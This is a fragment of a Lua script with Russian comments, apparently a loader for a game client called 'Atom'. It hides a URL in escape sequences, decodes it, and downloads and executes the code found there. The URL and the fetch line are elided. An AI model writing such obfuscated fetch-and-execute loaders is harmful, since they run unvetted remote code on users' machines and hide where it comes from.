...
-- Задаем новый URL-адрес, закодированный в escape-последовательности
...
-- Функция для декодирования закодированного URL
local function b(c)
    local d = ""
...
-- Функция для загрузки и выполнения кода с URL
local function g(h)
...
-- Проверяем, что URL декодирован успешно и загружаем код
if f then
    g(f)
else
    warn("Can't load Atom - Client.")
